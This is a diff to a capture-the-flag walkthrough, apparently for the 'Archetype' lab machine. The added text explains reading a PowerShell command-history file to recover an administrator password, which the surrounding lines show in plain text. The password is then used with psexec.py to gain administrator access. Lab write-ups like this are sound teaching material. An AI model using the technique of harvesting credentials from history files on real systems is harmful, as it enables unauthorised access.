@@ -378,6 +378,8 @@ d-----        9/15/2018  12:12 AM                AdvancedInstallers
 ```
 
 ### 5. Elavation of privilege
+To serch the file which the user used frequency, we can see the ConsoleHost_history.txt file.
+The default location of this file is $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt[1](https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics "1").
 
 ```
 #type C:\Users\sql_svc\AppData\Roaming\Microsoft\windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -385,6 +387,7 @@ net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
 exit
 ```
 
+We can get administrator's password and try to connect as an administrator using it.
 
 ```
 python3 psexec.py administrator@10.10.10.27
@@ -441,3 +444,8 @@ b91XXXXXXXXXXXXXXXXXXXXXXXXXXX28
 
 
 ```
+
+Finally, we can get root.txt on its Desktop directory.
+
+written by taka.
+Please leave your comments if you have trouble.
